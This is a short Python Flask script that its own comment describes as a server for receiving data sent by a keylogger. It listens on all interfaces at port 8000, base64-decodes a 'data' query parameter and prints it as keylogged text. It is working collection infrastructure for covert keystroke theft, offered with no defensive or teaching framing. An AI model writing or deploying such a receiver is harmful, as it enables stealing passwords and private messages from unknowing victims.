#Simple server to retrive the data send with the keylogger a simple python http server via bash works aswell(python3 -m http-server)

from flask import Flask, request
import base64

app = Flask(__name__)

@app.route('/endpoint', methods=['GET'])
def handle_data():
    data = request.args.get("data")
    try:
        decoded_data = base64.b64decode(data).decode()
        print(f"Keylogged: {decoded_data}")
    except:
        print("Could not decode")

if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=8000)